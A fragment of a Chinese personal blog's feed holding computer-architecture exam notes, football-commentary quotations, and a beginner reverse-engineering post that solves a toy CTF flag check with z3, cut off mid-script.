src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102114754390.png\" alt=\"image-20230102114754390\"></p>\n<p>（7+9<em>99）&#x2F;1000,(7+9</em>9)&#x2F;100,7&#x2F;10?</p>\n<p>for(R3&#x3D;9;R3&gt;0;R3–)for(R2&#x3D;9;R2&gt;0;R2–)for(R1&#x3D;9;R1&gt;0;R1–){…}</p>\n<p>R0的值恒为0</p>\n<p>BENZ，BEQZ均为条件分支指令；<br>BENZ R1,NAME;&#x2F;&#x2F;R1不等于0，程序跳转，以NAME为偏移地址<br>BEQZ R1,NAME;&#x2F;&#x2F;R1&#x3D;0，程序跳转到，以NAME为偏移地址<br>否则，执行下一条指令</p>\n<p>**bne (不相等则分支):**bne $s0,$s1,L1</p>\n<h1 id=\"第九章-运算部件\"><a href=\"#第九章-运算部件\" class=\"headerlink\" title=\"第九章 运算部件\"></a>第九章 运算部件</h1><p>华莱士树</p>\n<h1 id=\"第十章-高速缓存\"><a href=\"#第十章-高速缓存\" class=\"headerlink\" title=\"第十章: 高速缓存\"></a>第十章: 高速缓存</h1><p>VIPT(虚index,实tag)结构中,需要在cache中使用页着色技术.vipt即用虚拟地址索引cache,用物理地址匹配tag</p>\n<p>当vipt的cache,每一路的容量大于页的大小的时候,就会出现cache别名问题</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231211724962.png\" alt=\"image-20221231211724962\"></p>\n<p>这个同学总结的非常精辟…我就不多费时间了…</p>\n<p>考虑如下情况：<br>32位机器，虚地址V1：0xe0001120 虚地址V2：0xf0002120，都映射到物理地址P: 0x00000120。<br>页大小4KB，占地址的低12位。于是虚拟地址和物理地址的第12位一定相同。<br>当Cache每路的大小不超过页大小时，用来i n d e x indexindex的地址位在[ 11 ： 0 ] 之间，于是V1和V2的i n d e x indexindex相同，在Cache中索引到同一项，于是不会出现别名。 当Cache每路的大小超过页大小时，如每路容量8KB，用来i n d e x indexindex的地址位在[ 12 ： 0 ]之间。而V1和V2的第13位不同，于是索引到Cache的不同行，于是出现了同一物理地址的多处备份，也即别名。<br>为解决别名问题，引入软件的<strong>页着色</strong>，它保证，在给虚拟地址分配物理地址时，如果两个虚拟地址映射到同一物理地址，要求两个虚拟地址的<strong>页着色位相同</strong>，即上图中对应Cache I n d e x IndexIndex与P a g e − o f f s e t Page-offsetPage−offset之间差额的灰色部分相同。</p>\n<h1 id=\"第十一章-存储管理\"><a href=\"#第十一章-存储管理\" class=\"headerlink\" title=\"第十一章: 存储管理\"></a>第十一章: 存储管理</h1><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231225308131.png\" alt=\"image-20221231225308131\"></p>\n<p>16*4 + 128</p>\n<p>(64&#x2F;2 + 64&#x2F;2 ) * 3 + 64</p>\n<p>(64&#x2F;2 + 64&#x2F;2 ) * 3 + 64</p>\n<p>算的有点小问题….一个tlb项对应两个物理页才对</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101160302012.png\" alt=\"image-20230101160302012\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102112339663.png\" alt=\"image-20230102112339663\"></p>\n<p>ab都128页</p>\n<p>256次invalid</p>\n<p>refill的话 注意看两次循环是一个从头开始,一个从尾部开始,所以最后应该要有重叠的部分! </p>\n<p>应该是256-32</p>\n<h1 id=\"20年题目\"><a href=\"#20年题目\" class=\"headerlink\" title=\"20年题目\"></a>20年题目</h1><h2 id=\"1\"><a href=\"#1\" class=\"headerlink\" title=\"1\"></a>1</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231230312603.png\" alt=\"image-20221231230312603\"></p>\n<p>五级流水: 取址,译码,执行,访存,写会  IF,ID,EX,MEM,WB 英文全称是什么呢??</p>\n<p>指令相关: 数据相关、结构相关和控制相关</p>\n<p>数据相关: WAW,RAW,WAR</p>\n<h2 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2\"></a>2</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231230617385.png\" alt=\"image-20221231230617385\"></p>\n<p>注意还要除 million, 10的6次方</p>\n<p>(1)</p>\n<p>A:2  B:4 C:3 MIPS</p>\n<p>(2) 都一样,因为运行时间一样</p>\n<h2 id=\"3\"><a href=\"#3\" class=\"headerlink\" title=\"3\"></a>3</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231232854416.png\" alt=\"image-20221231232854416\"></p>\n<p>(1)</p>\n<p>原码: -2的63次方+1 ~ 2的63次方-1</p>\n<p>补码: -2的63次方 ~ 2的63次方-1</p>\n<p>(2)</p>\n<p>补码:1111 1111 ………………</p>\n<p>原码:1 0000000…… 1 </p>\n<p>所以是-1</p>\n<h2 id=\"4\"><a href=\"#4\" class=\"headerlink\" title=\"4\"></a>4</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231233718027.png\" alt=\"image-20221231233718027\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101005546680.png\" alt=\"image-20230101005546680\"></p>\n<h2 id=\"5\"><a href=\"#5\" class=\"headerlink\" title=\"5\"></a>5</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20221231235002314.png\" alt=\"image-20221231235002314\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101005607162.png\" alt=\"image-20230101005607162\"></p>\n<h2 id=\"6-电路图\"><a href=\"#6-电路图\" class=\"headerlink\" title=\"6 电路图\"></a>6 电路图</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101234018491.png\" alt=\"image-20230101234018491\"></p>\n<h2 id=\"7-多处理器\"><a href=\"#7-多处理器\" class=\"headerlink\" title=\"7 多处理器\"></a>7 多处理器</h2><h2 id=\"9-转移猜测\"><a href=\"#9-转移猜测\" class=\"headerlink\" title=\"9 转移猜测\"></a>9 转移猜测</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101150434124.png\" alt=\"image-20230101150434124\"></p>\n<h2 id=\"10\"><a href=\"#10\" class=\"headerlink\" title=\"10\"></a>10</h2><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101005258347.png\" alt=\"image-20230101005258347\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230101223241997.png\" alt=\"image-20230101223241997\"></p>\n<p>128+32invalid 64+32refill来着</p>\n<h1 id=\"7788的存储\"><a href=\"#7788的存储\" class=\"headerlink\" title=\"7788的存储\"></a>7788的存储</h1><p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102010039930.png\" alt=\"image-20230102010039930\"></p>\n<p>所以第十章第一题那三个如果都是32位处理器情况下tag都是31:12吗</p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102010922731.png\" alt=\"image-20230102010922731\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102011212154.png\" alt=\"image-20230102011212154\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/16279B7395C9EEC8444656E5E73B12C4.jpg\" alt=\"16279B7395C9EEC8444656E5E73B12C4\"></p>\n<p><img src=\"/ucas-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-%E5%A4%8D%E4%B9%A0%E4%B8%8A/image-20230102113847140.png\" alt=\"image-20230102113847140\"></p>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E4%BB%8E%E8%B6%B3%E7%90%83%E8%A7%A3%E8%AF%B4-%E8%AF%97%E4%BA%BA%E8%B4%BA%E7%82%9C%E9%82%A3%E9%87%8C%E5%AD%A6%E5%88%B0%E7%9A%84%E8%AF%97%E8%AF%8D%E6%AD%8C%E8%B5%8B/",
            "url": "https://tangzichengcc.github.io/%E4%BB%8E%E8%B6%B3%E7%90%83%E8%A7%A3%E8%AF%B4-%E8%AF%97%E4%BA%BA%E8%B4%BA%E7%82%9C%E9%82%A3%E9%87%8C%E5%AD%A6%E5%88%B0%E7%9A%84%E8%AF%97%E8%AF%8D%E6%AD%8C%E8%B5%8B/",
            "title": "从足球解说-诗人贺炜那里学到的诗词歌赋",
            "date_published": "2022-12-14T13:52:22.000Z",
            "content_html": "<p>生活可能不像你想象的那么好,但是也不会像你想象的那么糟.</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t–莫泊桑《人生》</p>\n<p>这个世上只有一种真正的英雄主义,那就是认清生活的真相并且仍然热爱它.</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t    –罗曼罗兰 《米开朗琪罗》</p>\n<p>胜不妄喜,败不惶馁,胸有激雷而面如平湖者,可拜上将军也.</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t–司马迁《史记》</p>\n<p>在人的一生中最为辉煌的一天并不是功成名就的那一天,而是从悲叹和绝望中产生对人生挑战的欲望,并且勇敢地迈向这种挑战的那一天</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t–福楼拜</p>\n<p>一个真正的强者,在面对着非常严峻的形势,面对着命运的折磨的时候,他们能够挽救自己,他们有坚强的神经,这个坚强的神经,钢铁一般的意志,一直流淌在德意志足球的血液当中.</p>\n<p>这是值得葡萄牙足球纪念的一个夜晚,法兰西球场的烟火为冠军而点燃,这就是足球,无论有多少人支持,你始终要为在场上每一个支持你的人拼尽全力,这不在乎数量的多少,也不在乎是在哪块土地上.</p>\n<p>每个人都有梦想,但不一定每个人都能达成自己的梦想,其实大部分人都达不到自己的梦想,但是最让人敬佩的人,不光是那些达成梦想的人,还是那些一直努力到梦想大门门口,也许他倒在那个门口,但是你知道他拼尽了最后的一份力气.</p>\n<p>他在很多情况下都成为巴西的救世主,这一次他还会成为巴西的救星吗?所有的人都在屏住呼吸, 助跑….打门…….非常漂亮!!!他相当的冷静,巴西队的十号球衣的主人,一定要有如此强大的心脏</p>\n<p>谁说这个世界是冰冷而残酷的,像乌拉圭人一样,只要你胸怀坚定的信仰,做好充分的准备,保持高昂的斗志,这个世界说不定就会揭开它冰冷的面纱,向你露出灿烂的微笑</p>\n<p>他们尽力了,人生当中总是有你能力所不及的范围,但是如果在你能力所及的范畴内,你尽到了自己全部的努力,那你还有什么可以遗憾</p>\n<p>夜幕之下的马拉卡纳,迎来了他的第二次世界杯决赛,科科瓦多山顶的救世基督,在俯瞰着红尘俯瞰着众生,所有的悲欢离合都没有什么大不了,但是我们毕竟身处红尘.</p>\n<p>也许他们会明白莫泊桑的一句话，生活可能不像你想象的那么好，但是，也不会像你想象的那么糟。人的脆弱和坚强，都超乎了自己的想象。有时候可能脆弱的一句话就会泪流满面，有时候，你发现自己咬着牙已经走了很长的路</p>\n<p>人类情绪当中的,最高昂的情绪和最低落的情绪,交相辉映而成,也许只有在失利者落寞的陪伴之下,胜利者才感觉得到幸福的滋味,而我们旁观的球迷,在这样的情感交织当中,终于体会到了活着的意味.</p>\n<p>自古打天下难,守天下更难,没有人可以永远站在顶峰,即使你可以做到居安思危,未雨绸缪,但是你身边全都是和你当年一样充满野心,充满激情和充满渴望的年轻人,他们把你的长处和短处放在显微镜下去研究,以及为标靶,你说你守天下难不难. 人生当中成功只是一时的，失败却是主旋律，但是如何面对失败却把人分成了不同的样子，有的人会被失败击垮，有的人能够不断的爬起来继续向前。我想真正的成熟应该并不是追求完美而是直面自己的缺陷，这才是生活的本质。罗曼罗兰说过的，这个世界上只有一种真正的英雄主义，那就是认清生活的真相并且任然热爱他。西班牙队从头再来吧! 难道向上攀爬的那条路不是比站在顶峰更让人热血澎湃吗</p>\n<p>达利奇的面上基本上没有什么表情,但是这,正是他的力量所在,胜不妄喜,败不惶馁,胸有激雷而面如平湖者,可拜上将军也.</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://www.bilibili.com/video/BV1kK41167ot\">https://www.bilibili.com/video/BV1kK41167ot</a></p>\n<p><a href=\"https://www.bilibili.com/video/BV14h411C7aL\">https://www.bilibili.com/video/BV14h411C7aL</a></p>\n",
            "tags": [
                "诗歌"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-1-%E5%88%9D%E6%8E%A2/",
            "url": "https://tangzichengcc.github.io/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-1-%E5%88%9D%E6%8E%A2/",
            "title": "逆向入门-1-初探",
            "date_published": "2022-12-12T02:42:06.000Z",
            "content_html": "<p>​        因为最近要给校队出题,本来出web,有个同学安排的re,但是他没学过,想和我换,虽然之前没系统接触过re,但是在学pwn的过程中也了解基本的逆向,就和他换了,借此机会简单学学逆向题目的思路.</p>\n<p>​       </p>\n<p>​        先来看这个社团ctf竞赛的题目,能够对逆向有个基本的认知,大概就是给你一个编译好了的二进制文件,反汇编反编译后得到伪代码,然后梳理伪代码的逻辑,去逆算法等,找到一个正确的输入值,从而或者输出值(flag)                 </p>\n<p>​\t\t例如下面这个例子,需要你输入flag,然后和正确的flag进行对比,对比正确则成功</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">check_flag</span><span class=\"params\">(<span class=\"type\">char</span> flag[])</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">char</span> flag[<span class=\"number\">30</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;输入的flag为：&quot;</span>);</span><br><span class=\"line\">\tfgets(flag,<span class=\"number\">30</span>,<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">\tcheck_flag(flag);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">check_flag</span><span class=\"params\">(<span class=\"type\">char</span> flag[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(flag[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;f&#x27;</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(flag[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;l&#x27;</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(flag[<span class=\"number\">2</span>] == <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(flag[<span class=\"number\">3</span>] == <span class=\"string\">&#x27;g&#x27;</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;yes,this is a flag&quot;</span>);</span><br><span class=\"line\">\t\t\t\t\tgetchar();</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/reverse<span class=\"meta\"># gcc check.c -o check</span></span><br><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/reverse# ./check</span><br><span class=\"line\">输入的flag为：flag</span><br><span class=\"line\">yes,this is a flag</span><br></pre></td></tr></table></figure>\n\n<p>​                                                                               </p>\n<h1 id=\"待完善\"><a href=\"#待完善\" class=\"headerlink\" title=\"待完善\"></a>待完善</h1><p>​        还是用上面链接里的例子,最后一题. 它是windows环境的,我的电脑是mac,进行一个简单修改,换成Linux下能运行的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"ISCC2018-My-math-is-bad\"><a href=\"#ISCC2018-My-math-is-bad\" class=\"headerlink\" title=\"ISCC2018-My math is bad\"></a>ISCC2018-My math is bad</h1><p><a href=\"https://rcoil.me/2018/05/%E3%80%90CTF%E3%80%91ISCC-2018/\">https://rcoil.me/2018/05/【CTF】ISCC-2018/</a></p>\n<p>​\t\t这个题需要你给一个输入s,然后s被拆成了8个部分,然后这8个部分需要满足一些条件,都满足后,就可以得到flag了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall main(<span class=\"built_in\">int</span> a1, char **a2, char **a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  puts(<span class=\"string\">&quot;=======================================&quot;</span>);</span><br><span class=\"line\">  puts(<span class=\"string\">&quot;= Welcome to the flag access machine! =&quot;</span>);</span><br><span class=\"line\">  puts(<span class=\"string\">&quot;=   Input the password to login ...   =&quot;</span>);</span><br><span class=\"line\">  puts(<span class=\"string\">&quot;=======================================&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%s&quot;</span>, s);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (unsigned <span class=\"built_in\">int</span>)sub_400766(<span class=\"string\">&quot;%s&quot;</span>, s) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    puts(<span class=\"string\">&quot;Congratulations! You should get the flag...&quot;</span>);</span><br><span class=\"line\">    sub_400B16(<span class=\"string\">&quot;Congratulations! You should get the flag...&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    puts(<span class=\"string\">&quot;Wrong password!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> 0LL;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t输入的s被拆成了很多部分, 为什么呢…</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:00000000006020A0 s               db <span class=\"number\">4</span> dup(?)             ; DATA XREF: sub_400766+<span class=\"number\">8</span>↑o</span><br><span class=\"line\">.bss:00000000006020A0                                         ; sub_400766:loc_400788↑o ...</span><br><span class=\"line\">.bss:00000000006020A4 ; <span class=\"built_in\">int</span> dword_6020A4</span><br><span class=\"line\">.bss:00000000006020A4 dword_6020A4    dd ?                    ; DATA XREF: sub_400766+2F↑o</span><br><span class=\"line\">.bss:00000000006020A8 ; <span class=\"built_in\">int</span> dword_6020A8</span><br><span class=\"line\">.bss:00000000006020A8 dword_6020A8    dd ?                    ; DATA XREF: sub_400766+3C↑o</span><br><span class=\"line\">.bss:00000000006020AC ; <span class=\"built_in\">int</span> dword_6020AC</span><br><span class=\"line\">.bss:00000000006020AC dword_6020AC    dd ?                    ; DATA XREF: sub_400766+<span class=\"number\">49</span>↑o</span><br><span class=\"line\">.bss:00000000006020B0 unk_6020B0      db    ? ;               ; DATA XREF: sub_400766+<span class=\"number\">56</span>↑o</span><br><span class=\"line\">.bss:00000000006020B1                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020B2                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020B3                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020B4 unk_6020B4      db    ? ;               ; DATA XREF: sub_400766+<span class=\"number\">63</span>↑o</span><br><span class=\"line\">.bss:00000000006020B5                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020B6                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020B7                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020B8 unk_6020B8      db    ? ;               ; DATA XREF: sub_400766+<span class=\"number\">70</span>↑o</span><br><span class=\"line\">.bss:00000000006020B9                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020BA                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020BB                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020BC unk_6020BC      db    ? ;               ; DATA XREF: sub_400766+7D↑o</span><br><span class=\"line\">.bss:00000000006020BD                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020BE                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020BF                 db    ? ;</span><br><span class=\"line\">.bss:00000000006020C0                 db    ? ;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>根据sub_400766可知<br>v2 &#x3D; unk_6020B0;<br>v3 &#x3D; unk_6020B4;<br>v4 &#x3D; unk_6020B8;<br>v5 &#x3D; unk_6020BC;</p>\n<p>所以s &#x3D; s + dword_6020A4 + dword_6020A8 + dword_6020AC + unk_6020B0 + unk_6020B4 + unk_6020B8 + unk_6020BC</p>\n<p>所以我们的目标就是解出来每个值,然后就得到了正确的输入,输入这个s,就可以得到flag了</p>\n<h2 id=\"python的z3库-解很多约束\"><a href=\"#python的z3库-解很多约束\" class=\"headerlink\" title=\"python的z3库,解很多约束\"></a>python的z3库,解很多约束</h2><p><a href=\"https://blog.csdn.net/A951860555/article/details/120177253\">https://blog.csdn.net/A951860555/article/details/120177253</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_52369224/article/details/120922901\">https://blog.csdn.net/weixin_52369224&#x2F;article&#x2F;details&#x2F;120922901</a></p>\n<p>把题目给的第一个约束条件转换一下,就得到一个四元一次方程组,进行求解即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">( dword_6020A4 * s - dword_6020AC * dword_6020A8 == <span class=\"number\">0x24CDF2E7C953DA56</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">( <span class=\"number\">3</span>* dword_6020A8 + <span class=\"number\">4</span> * dword_6020AC - dword_6020A4 - <span class=\"number\">2</span>*s == <span class=\"number\">397958918</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">( <span class=\"number\">3</span> *s * dword_6020AC - dword_6020A8 * dword_6020A4 == <span class=\"number\">0x2E6E497E6415CF3E</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">( <span class=\"number\">27</span> * dword_6020A4 + s - <span class=\"number\">11</span> * dword_6020AC - dword_6020A8 == <span class=\"number\">0x95AE13337</span> )</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>利用python的z3库进行求解.</p>\n<p><code>pip install z3-solver</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> * </span><br><span class=\"line\"></span><br><span class=\"line\">dword_6020A4 = Int(<span class=\"string\">&#x27;dword_6020A4&#x27;</span>)</span><br><span class=\"line\">dword_6020AC = Int(<span 